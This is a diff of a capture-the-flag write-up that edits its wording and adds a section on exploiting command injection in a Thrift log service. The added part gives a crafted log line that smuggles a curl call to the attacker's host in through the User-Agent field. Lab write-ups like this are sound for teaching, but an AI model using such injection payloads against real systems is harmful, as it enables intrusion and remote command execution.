@@ -609,7 +609,7 @@ The target is vulnerable.
 
 Next, we're going to read the `logs` directory via this technique:
 
-- NOTE: Important to include the admin cookies in our onliner.
+- Note: Important to include the admin cookies in our onliner.
 
 <br />
 
@@ -1102,11 +1102,12 @@ Here is the vulnerability. The `User-Agent` value originates from untrusted inpu
 
 ## Exploitation.
 
-### setup.
+### Setup.
 
 <br />
 
-To use the function of the `server.go` mentioned above, first, we need to create a client. To do it, we can use Python or Go, because as we say earlier, Apache Thrift is `multi-language`. 
+To use the `ReadLogFile` function defined in `server.go`, we first need to create a client. To do it, we can use Python or Go, because as we mentioned earlier, Apache Thrift is `multi-language`.
+
 
 We need to install the following dependencies:
 
@@ -1119,11 +1120,11 @@ apt install -y thrift-compiler
 
 <br />
 
-And `download` the LogService `.zip` file from GitBucket: 
+Then, `download` the LogService `.zip` file from GitBucket: 
 
 - http://caption.htb:8080/root/Logservice/archive/main.zip.
 
-Then, we can generate with `thrift` the neccessary `Python` source code to use the defined services in the file `log_service.thrift`:
+Then, we can generate with `thrift` the necessary `Python` source code to use the defined services in the file `log_service.thrift`:
 
 <br />
 
@@ -1141,7 +1142,9 @@ Then, we can generate with `thrift` the neccessary `Python` source code to use t
 
 Next, we'll build a minimal `Python client` to interact with the Thrift service.
 
-You can use the following code (Important to create the `client.py` inside the `/gen-py` directory):
+You can use the following code:
+
+- Note: You can place `client.py` anywhere as long as Python can import the `log_service` module from the `gen-py` folder.
 
 <br />
 
@@ -1199,12 +1202,50 @@ If we execute the client, we have an error:
 
 <br />
 
-This is because we need to create the `log` before executing the `Python` script.
+This error occurs because the log file does not exist yet — it must be created on the victim machine before running the script.
 
 <br />
 
 ## Command Injection.
 
 <br />
+
+We have two possible injection points:
+
+- The `IP` address.
+
+- The `User-Agent`.
+
+We will do it in the `User-Agent`, because the regex of the `IP` field is more restrictive.
+
+The regex of the `User-Agent` field is going to take anything that is not between `double quotes`.
+
+<br />
+
+```go 
+userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
+```
+
+<br />
+
+### lois.log.
+
+<br />
+
+To verify the command injection we can use `curl`.
+
+This is the content of the `log` file we will use:
+
+⚠️ Note: Make sure to create the log file `(lois.log)` on the victim machine before launching the client request.
+
+<br />
+
+```bash
+10.11.12.13 "user-agent":"test'; curl http://10.10.14.13/index.html #"
+```
+
+<br />
+
+
 
 
